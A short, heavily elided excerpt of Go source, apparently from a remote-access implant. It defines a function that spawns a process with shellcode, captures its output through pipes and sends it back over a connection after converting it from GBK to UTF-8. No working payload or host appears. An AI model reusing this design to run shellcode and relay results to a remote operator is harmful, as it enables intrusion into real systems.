...
func RunCreateProcessWithPipe[T any](Connection T, sendFunc func([]byte, T), shellcode []byte, prog string, args string) (stdOut, stdErr string) {
	...
	*/
	...
	go func() {
		for output := range outputChan {
			utf8Stdout, err := Function.ConvertGBKToUTF8(output)
			if err != nil {
